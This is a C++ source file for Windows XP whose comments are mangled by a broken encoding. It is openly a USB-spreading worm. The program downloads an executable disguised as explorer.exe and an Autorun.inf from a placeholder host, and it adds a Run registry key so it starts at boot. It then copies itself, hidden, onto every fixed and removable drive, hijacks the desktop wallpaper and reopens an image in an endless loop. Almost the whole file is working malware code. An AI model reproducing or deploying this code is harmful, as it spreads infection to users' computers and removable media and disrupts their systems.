//made by ������
//���´�����WindowsXP  Visual C++6.0 ����ͨ��
//�ó���ֻ�޸�XP����
//����ϵͳ�޸�������߿��Բο������������
//��Ը�����ܹ�תȥ��Ϣ��ȫϵ

#include "stdafx.h"
#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<urlmon.h>
#include<process.h>
#include<Shellapi.h>  //���ͷ�ļ�����ShellExecute�Ķ���
#include <iostream>
#include  <iomanip>
#include <fstream>
#include   <cstdio>   
#include   <stack>
#pragma comment (lib,"Urlmon.lib")
//����
void down();
bool Checkdisk();
void Scandisk();
void destory();
void reg();
int getname();
void drive();

using namespace std;
#define FILENAME "C:\\Autorun.inf"

int getname()//��ȡ��ǰ�û��� ���޸�ǽֽ ��Ҫ�����Ч
{
	char szName[1024];
	unsigned long lens = sizeof(szName);
	
	GetUserName(szName, &lens );
	
	
	static char subkey1[] = "Control Panel\\Desktop"; 
	static char vname1[] = "ConvertedWallpaper"; 
	static char exefile1[] = "C:\\progra~1\\Messenger\\jl.bmp"; 
	ULONG dType = REG_SZ, len = 0; 
	HKEY hKey; 
	RegOpenKeyEx(HKEY_CURRENT_USER,subkey1,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//�򿪡� 
	RegSetValueEx(hKey, vname1, 0, REG_SZ,(BYTE *)exefile1, strlen(exefile1)+1); //���ϡ� 
	RegCloseKey(hKey); //�رա�
	FILE *f;//����һ��ͼƬ
	f=fopen("change.bat","w=");
    fprintf(f,"copy C:\\progra~1\\Messenger\\jl.bmp C:\\docume~1\\%s\\LocalS~1\\Applic~1\\Microsoft\\Wallpaper1.bmp",szName);
    //ע��ʹ�ö��ļ���
	fprintf(f,"\n"); 
	fprintf(f,"del change.bat");//��ɾ��
	fclose(f);
	WinExec("change.bat",SW_HIDE);
	return 0;
	
}
void reg()//����ע������������
{
	static char subkey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
	static char vname[] = "explorer.exe"; 
	static char exefile[] = "C:\\progra~1\\Messenger\\explorer.exe"; 
	ULONG dType = REG_SZ, len = 0; 
	HKEY hKey; 
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//�򿪡� 
	if (RegQueryValueEx(hKey, vname, 0, &dType, NULL, &len))
	{ //���û��explorer�� 
		RegSetValueEx(hKey, vname, 0, REG_SZ,(BYTE *)exefile, strlen(exefile)+1); //�ͼ��ϡ� 
	} 
	RegCloseKey(hKey); //�رա�
	
}
void down()//����
{
	//websiteΪ����ļ�����ַ
	URLDownloadToFileA(NULL,"http://website/jl.bmp","C:\\progra~1\\Messenger\\jl.bmp",0,NULL);//�¾���ϵͳ�����ͼƬ
	URLDownloadToFileA(NULL,"http://website/explorer.exe","C:\\progra~1\\Messenger\\explorer.exe",0,NULL);//���ر��ļ�
	URLDownloadToFileA(NULL,"http://website/Autorun.inf","C:\\progra~1\\Messenger\\Autorun.inf",0,NULL);//���ļ�
	ShellExecuteA(0,"open","C:\\progra~1\\Messenger\\jl.bmp",NULL,NULL,SW_SHOW);//�����ļ�
}
void destory()
{
	int i=1;
	while(i<=100)
	{
		ShellExecute(0,"open","C:\\progra~1\\Messenger\\jl.bmp",NULL,NULL,SW_SHOW);//�����ļ�
		Sleep(13000);	
	}
}
void drive()//���Ƶ�������
{
	char drive[4]={0};
	wsprintf(drive,"C:\0");
	drive[0]='C';
	while(drive[0]<='Z')
	{
		if(GetDriveType(drive)==DRIVE_FIXED)
		{
			FILE *f;
			f=fopen("drive.bat","w=");
			fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe %c:\\explorer.exe",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"copy C:\\progra~1\\Messenger\\Autorun.inf %c:\\Autorun.inf",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\Autorun.inf",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\explorer.exe",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"del drive.bat");
			fclose(f);
			WinExec("drive.bat",SW_HIDE);
			Sleep(500);
			//return true;
		}
		drive[0]++;
	}
}
bool Checkdisk()//ɨ���Ƿ����ƶ���
{
	char usb[4]={0};
	wsprintf(usb,"C:\0");//����Ҫ
	usb[0]='C';
	
	while(usb[0]<='Z')
	{
		if(GetDriveType(usb)==DRIVE_REMOVABLE)
		{
			FILE *f;
			f=fopen("usb1.bat","w=");
			fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe %c:\\explorer.exe",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"copy C:\\progra~1\\Messenger\\Autorun.inf %c:\\Autorun.inf",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\Autorun.inf",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\explorer.exe",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"del usb1.bat");
			fclose(f);
			WinExec("usb1.bat",SW_HIDE);
			return true;
		}
		
		
		usb[0]++;
		
	}
	
	//	}
	
	return false;
}
void Scandisk()//��ʱ����Ƿ����ƶ���
{
	while(!Checkdisk())
	{
		Sleep(4000);//ɨ���ֹͣ4��
	}
}


void EntryPoint() 
{ 
	ExitProcess(WinMain(GetModuleHandle(NULL), NULL, GetCommandLine(), SW_HIDE)); 
}
//������
int WINAPI WinMain(HINSTANCE hInstance,
				   HINSTANCE hPrevInstance,
				   LPSTR     lpCmdLine,
				   int       nCmdShow)
				   
{
    down();
	getname();	//����ע����ֵ�����Ҹ����ļ���ָ��Ŀ¼
	reg();		////����ע������������
	
    
	drive();
	Checkdisk();
    Scandisk();
	destory();
	
	
	
	return 0;
}
